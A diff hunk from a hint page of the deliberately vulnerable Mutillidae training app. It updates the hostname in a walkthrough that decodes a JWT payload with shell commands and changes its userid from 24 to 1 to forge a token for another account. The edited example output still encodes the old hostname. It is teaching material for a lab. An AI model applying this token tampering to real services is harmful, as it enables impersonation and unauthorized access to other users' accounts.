@@ -49,13 +49,13 @@ The data in the payload is application dependent, but often contains some standa
 
 	echo 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9tdXRpbGxpZGFlLmxvY2FsIiwiYXVkIjoiaHR0cDpcL1wvbXV0aWxsaWRhZS5sb2NhbCIsImlhdCI6MTYxNDc4MTcwMCwiZXhwIjoxNjE0NzgzNTAwLCJ1c2VyaWQiOiIyNCJ9.2tkqvTgkNm4k8-L9MTIVIo7fdT1R53R_g7SO5QUCaFE' | cut -d. -f2 | base64 -d
 
-	Result: {"iss":"http:\/\/mutillidae.local","aud":"http:\/\/mutillidae.local","iat":1614781700,"exp":1614783500,"userid":"24"}
+	Result: {"iss":"http:\/\/mutillidae.localhost","aud":"http:\/\/mutillidae.localhost","iat":1614781700,"exp":1614783500,"userid":"24"}
 </code>
 <p>
 	Alter the value of the userid field and base64url encode:
 </p>
 <code>
-	echo -n '{"iss":"http:\/\/mutillidae.local","aud":"http:\/\/mutillidae.local","iat":1614781700,"exp":1614783500,"userid":"1"}' | base64 -w0
+	echo -n '{"iss":"http:\/\/mutillidae.localhost","aud":"http:\/\/mutillidae.localhost","iat":1614781700,"exp":1614783500,"userid":"1"}' | base64 -w0
 
 	Result: eyJpc3MiOiJodHRwOlwvXC9tdXRpbGxpZGFlLmxvY2FsIiwiYXVkIjoiaHR0cDpcL1wvbXV0aWxsaWRhZS5sb2NhbCIsImlhdCI6MTYxNDc4MTcwMCwiZXhwIjoxNjE0NzgzNTAwLCJ1c2VyaWQiOiIxIn0=
 </code>
